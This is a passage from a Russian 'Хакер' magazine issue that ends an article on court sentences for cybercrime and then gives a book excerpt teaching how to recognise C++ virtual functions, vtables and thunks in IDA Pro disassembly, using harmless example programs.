«закупали» ПО, общая стоимость которого превыша ла мил лион рублей (осо‐
бо крупный ущерб), поэто му подсудимым назначалось более строгое наказа‐
ние, вплоть до лишения свободы условно.


Игровые приставки и онлайн-игры
В ряде случаев подсудимые нейтрализовали сис тему защиты игровых прис‐
тавок Sony PlayStation, чтобы потом их про дать. Одному наруши телю наз‐
начено наказание в виде ограничения свободы, второй получил условный
срок в один год. В случае с компь ютер ной игрой подсудимый блокировал тех‐
нические средства защиты R2 Online. Уголовное дело было прекращено, наз‐
начен штраф в размере 100 тысяч рублей.


МАЙНИНГ
Два сотрудника государственного предпри ятия «Российский федеральный
ядерный центр — Всероссийский научно‐исследовательский институт экспе‐
риментальной  физики» решили  использовать  компьюте ры  организации
для майнинга криптовалюты. Они старались скрыть свою деятельность,
но  тем  не  менее  были  пойманы.  Ущерб  пред приятию  оценили
в 1 087 448 рублей. Один из майнеров получил три года и три месяца
лишения свободы со штрафом в 200 тысяч рублей, второй — четыре года
условно со штрафом в 250 тысяч рублей.


ВЫВОДЫ
Российская судебная система  отличается мяг костью и снис хождением
к киберпреступникам. Реальные сроки получа ют те, кто причастен к совер‐
шению общественно опас ных прес туплений, свя занных с хищением денег,
или рецидивисты. Довольно час то уголовное дело прекращают и назначают
судебный штраф. Это спа сает начинающих хакеров от пожизненного клейма
в виде судимости и последу ющих проблем с трудоустройством.
   Что  касается поимки серь езных киберпреступников,  то чаще все го
перед судом предстают мулы, дроповоды и обналь щики, а реальные орга‐
низаторы избе гают наказа ния. Успешным примером ликвидации деятельнос‐
ти хакерской группировки можно считать разве что задержание учас тников
группы Lurk, судебный про цесс над которыми еще продолжается.
  Нередко  к  уголовной  ответс твенности  привлекают  IT‐специалис тов
за установ ку нелицензионного ПО. Учитывая низ кую степень опас ности прес‐
тупления, справедливее было бы прекращать уголовное дело с наз начением
штрафа.
  Инструментарий для взлома и констру ирования вредоносов становится
все доступнее, так что нас наверняка ждет еще больше громких заголовков
в СМИ о поимке и разоблачении крутых грозных хакеров, которыми в боль‐
шинстве  случаев  оказываются  далекие  от   IT  рядовые  исполнители
и скрипт‐кидди.
ВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
          ОСНОВЫ
          ХАКЕРСТВА





                                                                    Крис Касперски
                                                                            Известный российский
                                                                                        хакер. Легенда ][, ex‐
                                                                               редактор ВЗЛОМа. Также
                                                                               известен под псевдонимами
                                                                        мыщъх, nezumi (яп. 鼠,
                                                                           мышь), n2k, elraton, souriz,
                                                                                                        tikus, muss, farah, jardon,
                                                                               KPNC.

КАКИЕ БЫВАЮТ
ВИРТУАЛЬНЫЕ
ФУНКЦИИ

                                                            Юрий ЯзевИ КАК ИХ ИСКАТЬ
                                                                      Широко известен под
                                                                          псевдонимом yurembo.
                                                                            Программист, разработчик
                                                                                  видеоигр, независимый
                                                                                исследователь. Старый автор
                                                                                журнала «Хакер».
                                                                                    yazevsoft@gmail.com





В своем бес тселлере «Фундаментальные основы хакерс‐
тва», увидевшем свет более 15 лет назад, Крис Касперски
поделился с читателями секретами дизассемблирования
и исследования программ. Мы про должаем публиковать
отрывки из обновленного изда ния его кни ги. Сегодня мы
поговорим о виртуальных функциях, их особенностях и о хит‐
ростях, которые помогут отыскать их в коде.




Читай так же:
 • Проверка аутентичнос ти и базовый взлом защиты
 • Знакомство с отладчиком
 • Продолжаем осваивать отладчик
 • Новые способы находить защитные механизмы в чужих программах
 • Выбираем лучший редактор для вскрытия исполняемых файлов Windows
 • Мастер‐класс по анализу исполняемых файлов в IDA Pro
 • Учимся искать клю чевые структуры язы ков высокого уровня
 • Идентификация стартового кода и виртуальных функций приложений
   под Win64




ИДЕНТИФИКАЦИЯ ЧИСТО ВИРТУАЛЬНЫХ ФУНКЦИЙ
Если функция объявляется в базовом, а реализуется в производном клас се,
она называется чисто виртуальной функцией, а класс, содержащий хотя бы
одну такую функцию, — абстрактным классом. Язык C++ запрещает соз дание
экземпляров абстрактного класса, да и как они могут создаваться, если
по крайней мере одна из функций класса не определена?
  В стародав ние времена компилятор в вир туальной таблице замещал
вызов чисто виртуальной функции ука зателем на биб лиотечную функцию
purecall, потому что на ста дии компиляции программы он не мог гаран‐
тированно отловить все попытки вызова чисто виртуальных функций. И если
такой вызов происходил, управление получа ла заранее подставленная сюда
purecall, которая «ругалась» на зап рет вызова чис то виртуальных функций
и завершала работу приложения.
  Однако в сов ременных реалиях дело обстоит иначе. Компилятор отлавли‐
вает вызовы чисто виртуальных функций и банит их во вре мя компиляции.
Таким образом, он даже не соз дает таб лицы виртуальных методов для абс‐
трактных классов.





              Реализация вызова виртуальных функций

В этом нам поможет убедиться следующий пример  (лис тинг примера
PureCall):


#include <stdio.h>


class Base {
public:
  virtual void demo(void) = 0;
};


class Derived :public Base {
public:
  virtual void demo(void) {
    printf("DERIVED\n");
  }
};


int main()
{
  Base *p = new Derived;
  p‐>demo();
  delete p; // Хотя статья не о том, как писать код на C++,
            // будем правильными до конца
}

Результат его компиляции в общем случае должен выглядеть так:


main proc near
  push    rbx
  sub     rsp, 20h
  mov     ecx, 8      ; size
  ; Выделение памяти для нового экземпляра объекта
  call    operator new(unsigned __int64)
  mov     rbx, rax
  lea     rax, const Derived::`vftable'
  mov     rcx, rbx    ; this
  mov     [rbx], rax
  ; Вызов метода
  call    cs:const Derived::`vftable'
  mov     edx, 8      ; __formal
  mov     rcx, rbx    ; block
  ; Очищаем выделенную память, попросту удаляем объект
  call    operator delete(void *,unsigned __int64)
  xor     eax, eax
  add     rsp, 20h
  pop     rbx
  retn
main endp

Чтобы узнать, какой метод вызывается инструкцией call  cs:const  De‐
rived::'vftable', надо сначала перей ти в таб лицу вир туальных методов
класса Derived (нажав Enter):


const Derived::`vftable' dq offset Derived::demo(void)

а отсюда уже в сам метод:


public: virtual void Derived::demo(void) proc near
        lea     rcx, _Format    ; "DERIVED\n"
        jmp     printf
public: virtual void Derived::demo(void) endp

В дизассемблерном листинге для x86 IDA сразу подставляет правильное имя
вызываемого метода:


call    Derived::demo(void)

Это мы выяснили. И никако го намека на purecall.
   Хочу также обратить твое внимание на следующую деталь. Старые ком‐
пиляторы вставляли код проверки и обработки ошибок выделе ния памяти
непосредственно после операции выделения памяти, тогда как современные
компиляторы перенесли эту заботу внутрь операто ра new:


void * operator new(unsigned __int64) proc near
  push    rbx
  sub     rsp, 20h
  mov     rbx, rcx
  jmp     short loc_14000110E ; После пролога выполняется
                              ; безусловный переход
loc_1400010FF:
  mov     rcx, rbx
  call    _callnewh_0         ; Вторая попытка выделения памяти
  test    eax, eax
  jz      short loc_14000111E ; Если память снова не удалось
                              ; выделить — переходим в конец,
                              ; где вызываем функции
                              ; обработки ошибок
  mov     rcx, rbx            ; Size
loc_14000110E:
  call    malloc_0            ; Первая попытка выделения памяти
  test    rax, rax            ; Проверка успешности выделения
  jz      short loc_1400010FF ; Если rax == 0 — значит, произошла
                              ; ошибка и память не выделена.
                              ; Тогда совершаем переход
                              ; и делаем еще попытку
  add     rsp, 20h
  pop     rbx
  retn
loc_14000111E:
  cmp     rbx, 0FFFFFFFFFFFFFFFFh
  jz      short loc_14000112A
  call    __scrt_throw_std_bad_alloc(void)
  align 2
loc_14000112A:
  call    __scrt_throw_std_bad_array_new_length(void)
  align 10h
void * operator new(unsigned __int64) endp

После пролога функции командой jmp short loc_14000110E выполняется
безусловный переход на код для выделения памяти: call malloc_0. Про‐
веряем результат операции: test rax, rax. Если выделение памяти про‐
валилось, переходим на мет ку jz short loc_1400010FF, где еще раз пыта‐
емся зарезервировать память:


mov     rcx, rbx
call    _callnewh_0
test    eax, eax

Если эта попытка тоже проваливается, нам ничего не остается, как перейти
по метке jz short loc_14000111E, обработать ошиб ки и вывести соответс‐
твующее ругательство.


СОВМЕСТНОЕ ИСПОЛЬЗОВАНИЕ ВИРТУАЛЬНОЙ ТАБЛИЦЫ
НЕСКОЛЬКИМИ ЭКЗЕМПЛЯРАМИ КЛАССА
Сколько бы экземпляров клас са (дру гими словами, объ ектов) ни существо‐
вало, все они пользуют ся одной и той же виртуаль ной таб лицей. Виртуальная
таблица принадлежит самому клас су, но не экземпляру (экземплярам) этого
класса. Впрочем, из этого пра вила существу ют исклю чения.





   Все экземпляры клас са используют одну и ту же виртуальную таблицу

Для демонстрации совместного использования одной копии виртуальной
таблицы несколькими экземплярами класса рас смот рим сле дующий при мер
(листинг примера UsingVT):


#include <stdio.h>
class Base {
  public:
  virtual void demo()
  {
    printf("Base\n");
  }
};


class Derived : public Base {
  public:
  virtual void demo()
  {
    printf("Derived\n");
  }
};


int main()
{
  Base *obj1 = new Derived;
  Base *obj2 = new Derived;
  obj1‐>demo();
  obj2‐>demo();
  delete obj1;
  delete obj2;
}

Результат его компиляции в общем случае должен выглядеть так:


main proc near
  mov      [rsp+arg_0], rbx
  mov      [rsp+arg_8], rsi
  push     rdi
  sub      rsp, 20h
  mov      ecx, 8 ; size
  ; Выделяем память под первый экземпляр класса
  call     operator new(unsigned __int64)
  ; В созданный объект копируем виртуальную таблицу класса Derived
  lea      rsi, const Derived::`vftable'
  mov      ecx, 8 ; size
  mov      rdi, rax
  ; RAX теперь указывает на первый экземпляр
  mov      [rax], rsi
  ; Выделяем память под второй экземпляр класса
  call     operator new(unsigned __int64)
  ; В RDI — указатель на виртуальную таблицу класса Derived
  mov      rcx, rdi
  mov      rbx, rax
  ; В RSI находится первый объект
  mov      [rax], rsi
  ; Берем указатель на виртуальную таблицу методов
  mov      r8, [rdi]
  ; Для первого объекта, скопированного в RAX, вызываем метод
  ; по указателю в виртуальной таблице
  call     qword ptr [r8]
  ; В RBX — указатель на виртуальную таблицу класса Derived
  mov      r8, [rbx]
  mov      rcx, rbx
  ; Вызываем метод по указателю в этой же самой таблице
  call     qword ptr [r8]
  mov      edx, 8                         ; __formal
  mov      rcx, rdi                       ; block
  call     operator delete(void *,unsigned __int64)
  mov      edx, 8                         ; __formal
  mov      rcx, rbx                       ; block
  call     operator delete(void *,unsigned __int64)
  mov      rbx, [rsp+28h+arg_0]
  xor      eax, eax
  mov      rsi, [rsp+28h+arg_8]
  add      rsp, 20h
  pop      rdi
  retn
main endp

Виртуальная таблица клас са Derived выглядит так:


const Derived::`vftable' dq offset Derived::demo(void), 0

Обрати внимание: вир туальная таблица одна на все экземпляры класса.


КОПИИ ВИРТУАЛЬНЫХ ТАБЛИЦ
Окей, для успешной работы, понятное дело, вполне достаточно и одной вир‐
туальной таблицы, одна ко на практике приходится стал киваться с тем, что
исследуемый файл прямо‐таки кишит копиями этих виртуальных таблиц. Что
же это за напасть такая, откуда она берется и как с ней бороться?
   Если программа состоит из нес кольких файлов, компилируемых в самос‐
тоятельные obj‐модули (а такой подход используется практически во всех
мало‐мальски серьезных проектах), компилятор, очевидно, дол жен помес‐
тить в каждый obj свою собственную виртуаль ную таблицу для каждого
используемого модулем клас са. В самом деле, откуда компилятору знать
о существовании других obj и наличии в них вир туаль ных таблиц?
   Вот так и возникают никому не нужные дубли, отъ едающие память и зат‐
рудняющие анализ. Правда, на этапе компоновки линкер может обнаружить
копии и удалить их, да и сами компиляторы исполь зуют различные эвристи‐
ческие  при емы  для  повышения  эффективности  генерируемого  кода.
Наибольшую популярность завоевал следующий алгоритм: виртуальная таб‐
лица помещается в тот модуль, в котором содержится реализация первой
невстроенной невир туаль ной функции клас са.
  Обычно каждый класс реализуется в одном модуле, и в большинстве слу‐
чаев такая эвристика сра батывает. Хуже, если класс состоит из одних вир‐
туальных или встраиваемых функций. В этом слу чае компилятор «ложится»
и начинает запихивать виртуальные таб лицы во все модули, где этот класс
используется. Последняя надежда на удаление «мусорных» копий — линкер,
но и он не панацея. Собственно, эти проб лемы должны больше заботить раз‐
работчиков программы (если их волнует, сколь ко памяти занимает прог‐
рамма), для анализа лишние копии всего лишь досадная помеха, но отнюдь
не непреодолимое препятствие!


СВЯЗАННЫЙ СПИСОК
В большинстве случаев виртуальная таблица — это обыкновенный массив,
но некоторые компиляторы представляют ее в виде связанного спис ка. Каж‐
дый элемент виртуальной таблицы содержит ука затель на сле дующий эле‐
мент, а сами элементы не раз мещены вплотную друг к другу, а рассеяны
по всему исполняемому файлу.
  На практике подоб ное, одна ко, попада ется крайне редко, поэтому
не будем подробно на этом останавливаться — дос таточно лишь знать, что
такое бывает. Если ты встретишься со списками (впрочем, это вряд ли) —
разберешься по обстоятельствам, благо это несложно.


ВЫЗОВ ЧЕРЕЗ ШЛЮЗ
Будь также готов и к тому, чтобы встретить в виртуальной таб лице указатель
не на виртуальную функцию, а на код, который модифицирует этот указатель,
занося в него смещение вызываемой функции. Этот при ем был предложен
самим разработчиком языка C++ Бьерном Страуструпом, позаимс твовавшим
его из ранних реализаций алго ла‐60. В алголе код, корректирующий ука‐
затель вызываемой функции, называется шлюзом (thunk), а сам вызов —
вызовом через шлюз. Вполне спра ведливо употреблять эту терминологию
и по отношению к C++.
  Однако в настоящее время вызов через шлюз чрез вычайно мало рас‐
пространен и не используется практически ни одним компилятором. Нес‐
мотря на то что он обес печивает более компактное хранение виртуальных
таблиц, модификация ука зателя приводит к излишним накладным расходам
на процессорах с конвейерной архитек турой (а все современные процес‐
соры как раз и построены на основе такой архитектуры). Поэтому исполь‐
зование шлюзовых вызовов оправданно лишь в программах, кри тических
к размеру, но не к скорости.
  Подробнее обо всем этом можно прочесть в руководстве по алголу‐60
(шутка) или у Бьерна Стра уструпа в «Дизайне и эво люции языка C++».


СЛОЖНЫЙ ПРИМЕР НАСЛЕДОВАНИЯ
До сих пор мы рассматривали лишь прос тейшие примеры использования
виртуальных функций. В жизни же порой встречается такое... Рас смотрим
сложный  случай  наследования  с  конфликтом  имен, демонстрирующий
помещение невиртуальных функций в вир туальные таблицы (листинг при мера
HardSample):


#include <stdio.h>


class A {
  public:
  virtual void f()
  {
    printf("A_F\n");
  }
};


class B {
  public:
  virtual void f()
  {
    printf("B_F\n");
  }
  virtual void g()
  {
    printf("B_G\n");
  }
};


class C : public A, public B {
  public:
  void f()
  {
    printf("C_F\n");
  }
};


int main()
{
  A *a = new A;
  B *b = new B;
  C *c = new C;
  a‐>f();
  b‐>f();
  b‐>g();
  c‐>f();
  delete a;
  delete b;
  delete c;
}

Как будет выглядеть виртуальная таблица класса C? Так, давай подумаем: раз
класс C — производный от классов A и B, то он наследу ет функции обоих,
но виртуальная функция f() класса B перекрывает одноименную виртуаль‐
ную функцию класса A, поэто му из класса А она не нас ледуется. Далее, пос‐
кольку невиртуальная функция f() при сутс твует и в производном клас се C,
она перекрывает вир туальную функцию класса B (да, именно так, а вот невир‐
туальная функция невиртуальную не перекрывает, и она всегда вызывается
из базового, а не производного клас са). Таким образом, виртуальная таб‐
лица класса C дол жна содержать только один элемент — указатель на вир‐
туальную функцию g(), унас ледованную от B, а невиртуальная функция f()
вызывается как обычная C‐функция. Пра вильно? Нет!
   Из‐за подобных сложностей, возника ющих при использовании множес‐
твенного наследования классов, более современные по сравнению с C++
языки (например, такие как Java, C#, Swift) его не реализуют. Тем не менее
в них допускается множественная реализация интерфейсов (или протоколов
в Swift). А последние, как извес тно, не содержат реализации объ явленных
методов, поэтому таких неопределенностей не возникает. В C++ для избе‐
гания таких ситуаций используются абстрактные клас сы, но в реальности вся‐
кое приходится анализировать.
   Здесь мы видим как раз тот случай, когда невиртуальная функция вызыва‐
ется через указатель как виртуальная функция. Более того, виртуальная таб‐
лица класса будет содержать не два, а три элемента! Третий элемент —
это ссылка на виртуальную функцию f(), унаследованную от B, но тут же
замещенная ком пилято ром на «переходник» к C::f(). Уф... Как все непросто!
Может, после изучения дизас семблерного листинга это станет понятнее?


main proc near
  mov     [rsp+arg_0], rbx
  mov     [rsp+arg_8], rsi
  push    rdi
  sub     rsp, 20h
  mov     ecx, 8      ; size

Выделяем память для объекта A:


call    operator new(unsigned __int64)
mov     rsi, rax
mov     ecx, 8      ; size

Помещаем в объект A ука затель на его вир туальную таблицу:


lea     rax, const A::`vftable'
mov     [rsi], rax

Выделяем память для объекта B:


call    operator new(unsigned __int64)
mov     rdi, rax
mov     ecx, 10h    ; size

Помещаем в объект B указатель на его вир туаль ную таблицу:


lea     rax, const B::`vftable'
mov     [rdi], rax

Выделяем память для объекта C:


call    operator new(unsigned __int64)
mov     rbx, rax
mov     rcx, rsi

Помещаем в объект C указатель на виртуальную таблицу класса A:


lea     rax, const C::`vftable'{for `A'}
mov     [rbx], rax

Помещаем в объект C указатель на виртуальную таблицу класса B, то есть
в результате объект C будет содержать два указателя на две виртуальные
таблицы базовых классов.


lea     rax, const C::`vftable'{for `B'}
mov     [rbx+8], rax

Далее следует код, в котором для каж дого созданного объ екта в соответс‐
твии со смещением в виртуальной таблице происходит вызов метода.
По дизассемблерному листингу мож но разобраться, кто и что вызывает.


mov     r8, [rsi]
call    qword ptr [r8]

Первым делом надо определить, что находится в регистре RSI. Сделать
это не составляет труда, надо лишь взглянуть в окно IDA и подвести курсор
к обозначенному выше регистру. После чего он подсветится во всем лис‐
тинге (см. рисунок ниже).
   Таким нехитрым обра зом определяем, что в регистре RSI находится объ‐
ект A со своей виртуальной таблицей методов. Копируем RSI в R8 и вызываем
первый метод в таблице объекта A. Что бы узнать, какой же это метод, надо
перейти в виртуальную таблицу клас са A, дважды щел кнув на A::'vftable'.
В итоге обнаружим


const A::`vftable' dq offset A::f(void), 0

То есть первый и единственный метод f. Подведем к нему курсор ввода, наж‐
мем Enter, чтобы перейти в сам метод:


public: virtual void A::f(void) proc near
  lea     rcx, _Format    ; "A_F\n"
  jmp     printf
public: virtual void A::f(void) endp

Он, собственно, выводит строку A_F, что и требова лось доказать.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  ФУНДАМЕНТАЛЬНЫЕ
  ОСНОВЫ ХАКЕРСТВА
             КАКИЕ БЫВАЮТ ВИРТУАЛЬНЫЕ ФУНКЦИИ
                            И КАК ИХ ИСКАТЬ





ПЕРЕИМЕНОВАНИЕ ИНСТРУКЦИЙ
Мы рассмотрели только начало анализа вызыва емых методов из функции
main. Вернемся в ее дебри.
  Смотрим, что хранится в регистре RDI. Поднимаем глазки чуть выше,
видим, что в RDI находится объект B. Значит, в следующем фрагменте кода
происходит вызов двух его методов: пер вый — без сме щения в виртуальной
таблице call qword ptr [r8], а второй — со смещением — call qword
ptr [r8+8].


mov     r8, [rdi]
mov     rcx, rdi
call    qword ptr [r8]
mov     r8, [rdi]
mov     rcx, rdi
call    qword ptr [r8+8]


На заметку
Если строчка call qword ptr [r8] пор тит картину и охота привести листинг
к более ясному виду, заменив неявный вызов фактическим названием
метода, поступи сле дующим образом: подведи курсор мыши к строке call
qword ptr [r8], вызови кон текстное меню, в нем выбери пункт Manual... и в
строке ввода появив шегося окна вбей удобное наз вание, которое хочешь
присвоить, например A::f, как в нашем случае. Жми ОК. Вызов примет жела‐
емый вид. Чтобы проделать обратную операцию, то есть вернуть прежнюю
абракадабру, достаточ но таким же образом вызвать диалоговое окно Manual
operand и в нем очистить поле ввода.


Смотрим дальше. В регистре RBX находится объ ект C и происходит вызов
его метода:


mov     r8, [rbx]
mov     rcx, rbx
call    qword ptr [r8]

Удаление объектов:


...
  mov     edx, 8      ; __formal
  mov     rcx, rsi    ; block
  call    operator delete(void *,unsigned __int64)
  mov     edx, 8      ; __formal
  mov     rcx, rdi    ; block
  call    operator delete(void *,unsigned __int64)
  mov     edx, 10h    ; __formal
  mov     rcx, rbx    ; block
  call    operator delete(void *,unsigned __int64)
  mov     rbx, [rsp+28h+arg_0]
  xor     eax, eax
  mov     rsi, [rsp+28h+arg_8]
  add     rsp, 20h
  pop     rdi
  retn
main endp





  Дизассемблированный лис тинг из IDA Pro, с подсвеченным регистром
  RSI

Рассмотрим виртуальные таблицы клас сов B и C:


const B::`vftable' dq
offset B::f(void),                                 ; 1‐й элемент
offset B::g(void),                                 ; 2‐й элемент
offset const A::`RTTI Complete Object Locator'

Так как класс B включает два виртуальных метода, его таб лица виртуальных
методов содержит два элемента: B::f и B::g. Виртуальная таблица клас са C:


dq offset const C::`RTTI Complete Object Locator'{for `B'}
const C::`vftable'{for `B'} dq
offset [thunk]:C::f`adjustor{8}' (void),           ; 1‐й элемент
offset B::g(void) dq                               ; 2‐й элемент
offset const C::`RTTI Complete Object Locator'{for `A'}
const C::`vftable'{for `A'} dq
offset C::f(void),                                 ; 3‐й элемент
offset const B::`RTTI Complete Object Locator'

Как мы и предполагали, таблица содержит три элемента! Виртуальная таб‐
лица класса C, скопиро ванная компилятором из клас са B, первоначально
состояла из двух указателей на функции f() и g(), но еще на стадии ком‐
пиляции компилятор разобрался в конфликте имен и заменил указатель
на B::f() указате лем на переходник к C::f(). При этом он распознал вызов
через шлюз, а IDA отметила это: [thunk], следом за которым идет ключевое
слово adjustor (корректор).
  Напоследок посмотрим на сами методы. У клас са B они выглядят вполне
ожидаемо:


public: virtual void B::f(void) proc near
        lea     rcx, aBF    ; "B_F\n"
        jmp     printf
public: virtual void B::f(void) endp


public: virtual void B::g(void) proc near
        lea     rcx, aBG    ; "B_G\n"
        jmp     printf
public: virtual void B::g(void) endp

У класса C вызов B::g(void), как и положено, вос ходит к методу класса B
(см. выше). Вызов C::f(void) обра щается к невиртуальному методу:


public: virtual void C::f(void) proc near
        lea     rcx, aCF    ; "C_F\n"
        jmp     printf
public: virtual void C::f(void) endp

В свою очередь, C::f'adjustor{8}' вызыва ет «сквозной» метод, переда‐
ющий управление на метод C::f(void).


[thunk]:public: virtual void C::f`adjustor{8}' (void) proc near
        sub     rcx, 8
        jmp     C::f(void) ; Передаем управление методу C::f(void)
[thunk]:public: virtual void C::f`adjustor{8}' (void) endp

Как видим, таблица виртуальных методов вполне может содержать указатель
на невиртуальный метод!
  На самом деле вир туаль ная таблица производного класса включает вир‐
туальные таблицы всех базовых клас сов (во всяком случае всех, отку да она
наследует виртуальные методы). В нашем при мере виртуальная таб лица
класса C содержит ука затель на собс твенный невиртуальный метод и вир‐
туальную таблицу класса B. Задача: как определить, что функция C::f()
невиртуальная? И как найти все базовые классы класса C?
   Начнем с последнего. Современные вер сии компилятора и дизас сембле‐
ра, идя рука об руку, явно показывают в виртуальной таблице и в коммента‐
рии к реализации метода, от какого класса он наследу ется:


; DATA XREF: .rdata:const C::`vftable'{for `A'}?o

Следовательно, класс C — производный от A. С дру гой стороны, а что, если
класс не наследует ни одной функции из базового класса? Тогда возникает
другой вопрос: так ли необ ходимо устанавливать «родите лей», от которых
не наследуется ни одной функции? (Если хоть одна функция наследу ется,
никаких сложностей в поиске, как мы видели, не возникает.) В общем‐то,
для анализа это действитель но некритично, но чем точнее будет вос станов‐
лен исходный код программы, тем нагляднее он будет и тем легче в нем
разобраться.
   Теперь перейдем к невиртуальной функции f(). Подумаем, что было бы,
будь она на самом деле виртуальной. Тогда она перекрыла бы одноименную
функцию базовых классов и никакой «дикости» наподобие «переходников»
в откомпилированной программе не встретилось бы. А так они свидетель‐
ствуют о том, что тут не все гладко и функция невиртуальная, хоть и стремится
казаться такой. Опять‐таки умный компилятор теоретически может выкинуть
переходник и дублирующийся элемент виртуаль ной таблицы класса C, но на
практике этой интеллек туальнос ти не наб люда ется...





            Вывод консольного при ложения HardSample


СТАТИЧЕСКИЕ ОБЪЕКТЫ
Есть ли разница, как создавать экземпляр клас са — MyClass zzz; или My‐
Class  *zzz  =  new  MyClass? Разумеется, в первом случае компилятор
может определить адреса вир туальных функций еще на стадии компиляции,
тогда как во втором это приходится вычислять во время выполнения прог‐
раммы. Другое различие: статичес кие объекты раз мещаются в стеке (сег‐
менте данных, первый случай), а динамичес кие — в куче (второй случай).
   Старые компиляторы упорно соз давали таблицы виртуальных функций
в обоих случаях, а при вызове каждой функции (вклю чая невиртуальные) под‐
готавливали указатель this (как правило, помеща емый в один из регистров
общего назначения), который содержит адрес экземпляра класса. Таким
образом, если мы встречали вызываемую непосредственно по ее смещению
функцию, которая в то же время присутству ет в виртуальной таб лице клас са,
можно было с уверенностью утверждать, что это виртуальная функция статич‐
ного экземпляра класса. Между тем современные компиляторы генерируют
абсолютно отличный код. Что бы увидеть это, рас смотрим следующий пример
вызова функции статического объекта (лис тинг при мера StaticObjects):


#include <stdio.h>


class Base {
  public:
  virtual void demo(void)
  {
    printf("BASE DEMO\n");
  }
  virtual void demo_2(void)
  {
    printf("BASE DEMO 2\n");
  }
  void demo_3(void)
  {
    printf("Non virtual BASE DEMO 3\n");
  }
};


class Derived : public Base {
  public:
  virtual void demo(void)
  {
    printf("DERIVED DEMO\n");
  };
  virtual void demo_2(void)
  {
    printf("DERIVED DEMO 2\n");
  }
  void demo_3(void)
  {
    printf("Non virtual DERIVED DEMO 3\n");
  }
};


int main()
{
  Base p;
  p.demo();
  p.demo_2();
  p.demo_3();


  Derived d;
  d.demo();
  d.demo_2();
  d.demo_3();
}





                Вывод приложения StaticObjects

В результате ком пиляции мы увидим такой дизас семблерный лис тинг:


main proc near
  sub     rsp, 28h
  lea     rcx, _Format         ; "BASE DEMO\n"
  call    printf
  lea     rcx, aBaseDemo2      ; "BASE DEMO 2\n"
  call    printf
  lea     rcx, aNonVirtualBase ; "Non virtual BASE DEMO 3\n"
  call    printf
  lea     rcx, aDerivedDemo    ; "DERIVED DEMO\n"
  call    printf
  lea     rcx, aDerivedDemo2   ; "DERIVED DEMO 2\n"
  call    printf
  lea     rcx, aNonVirtualDeri ; "Non virtual DERIVED DEMO 3\n"
  call    printf
  xor     eax, eax
  add     rsp, 28h
  retn
main endp

Вот так новость! Компилятор оптимизировал весь код в одну функцию!
Выкинув при этом объекты, их методы, вир туаль ные таблицы. Программа
берет из секции данных стро ковую константу, помещает ее в регистр RCX,
а затем вызывает функцию printf. Потом это дей ствие повторя ется еще пять
раз, и на этом работа приложения завершается. Ни малей шего упоминания
о виртуальных, невиртуальных функциях нет!


ИДЕНТИФИКАЦИЯ ВИРТУАЛЬНЫХ ТАБЛИЦ
Теперь, основательно освоившись с вир туальными таблицами и функциями,
рассмотрим очень коварный вопрос: всякий ли мас сив указателей на фун‐
кции есть виртуальная таблица? Разумеется, нет! Ведь косвенный вызов фун‐
кции через указатель — частое дело в практике программиста. Массив ука‐
зателей на функции... хм, конечно, типичным его не назовешь, но и такое
в жизни встре чается.
   Рассмотрим следующий пример — кривой и наигранный, конечно, — но,
чтобы продемонстрировать ситуацию, где мас сив указателей жизненно необ‐
ходим, пришлось бы написать не одну сотню строк кода (листинг примера
VT):


#include <stdio.h>


void demo_1(void)
{
  printf("Demo 1\n");
}


void demo_2(void)
{
  printf("Demo 2\n");
}


void call_demo(void **x)
{
  ((void(*)(void)) x[0])();
  ((void(*)(void)) x[1])();
}


int main()
{
  static void* x[2] =
  {
    (void*)demo_1,
    (void*)demo_2
  };


  call_demo(&x[0]);
}





                   Вывод приложения VT

А теперь посмотрим, сможем ли мы отличить рукотворную таблицу указате‐
лей от настоящей вир туальной таблицы:


main proc near
  sub     rsp, 28h
  call    cs:x
  call    cs:off_140003040
  xor     eax, eax
  add     rsp, 28h
  retn
main endp

Первое, что бросается в глаза, — это нетипичный для виртуальной функции
вызов: call cs:x. Как мы зна ем, перед вызовом виртуальной функции про‐
исходит копирование виртуальной таб лицы класса ее объекта, затем в дело
вмешивается указатель this. И толь ко после этого вызывается вир туальная
функция по сме щению от начала таблицы виртуальных функций. Здесь же
вызов происходит по смещению в сег менте кода. Второй вызов: call cs:
off_140003040 — аналогичен. То есть этот код слишком тривиален, тогда
как вызов виртуальной функции сопряжен с боль шой избыточностью.
  Поставив курсор на строку call cs:x, нажмем Enter для перехода в вир‐
туальную таблицу, которая в действительнос ти ей не является и только
на беглый, нетренированный взгляд на нее похожа:


x               dq offset demo_1(void)
off_140003040   dq offset demo_2(void)

На самом же деле это мас сив указателей, и он лишь с первого впе чатления
смахивает на виртуальную таблицу. В глаза сра зу бросается отсутствие име‐
ни класса и клю чевого слова vftable.
  Перейдем в тело функции demo_1:


void demo_1(void) proc near
  lea     rcx, _Format    ; "Demo 1\n"
  jmp     printf
void demo_1(void) endp


void demo_2(void) proc near
  lea     rcx, aDemo2     ; "Demo 2\n"
  jmp     printf
void demo_2(void) endp

Здесь мы видим отсутствие модификатора дос тупа, ключевого слова virtual
и имени класса. Все это подтвержда ет невир туальные корни функции.


ВТОРОЙ ВАРИАНТ ИНИЦИАЛИЗАЦИИ МАССИВА
Мы можем инициализировать массив не при его объявле нии, а по ходу прог‐
раммы. Это можно сделать, заменив конструкцию


static void* x[2] =
{
  (void*)demo_1,
  (void*)demo_2
};

вот таким вариантом:


static void* x[2];
x[0] = (void*)demo_1;
x[1] = (void*)demo_2;

В этом случае компилятор сгенерирует адекватный код, но смещения фун‐
кций будут заноситься в регистры пря мо перед вызовом непосредственно
в функции main.


main proc near
  sub     rsp, 28h
  lea     rax, demo_1(void)
  mov     cs:x, rax
  lea     rax, demo_2(void)
  mov     cs:qword_140003638, rax
  call    demo_1(void)
  call    cs:qword_140003638
  xor     eax, eax
  add     rsp, 28h
  retn
main endp

В результате на месте «вир туальной таблицы» будет совсем непохожий
на нее код:


x               dq ?
qword_140003638 dq ?

К тому же инициализация при объявлении (как в первом случае) помещает
уже готовые указатели в сег мент данных, и это сма хивает на настоящую вир‐
туальную таблицу (и экономит такты процессора).
  Обобщая выводы, повторим основные признаки подделки еще раз:
 • слишком тривиальный код, минимум используемых регистров и никакой
   избыточности, обращение к виртуальным таблицам происходит куда вити‐
   еватее;
 • указатель на вир туальную функцию заносится в экземпляр объ екта;
 • отсутствует указатель this, всегда подготавливаемый перед вызовом
   виртуальной функции;
 • виртуальные функции и ста тичес кие переменные располагаются в раз‐
   личных местах сегмента данных, поэтому сразу можно отличить одни
   от других.

А можно ли так организовать вызов функции по ссылке, чтобы компиляция
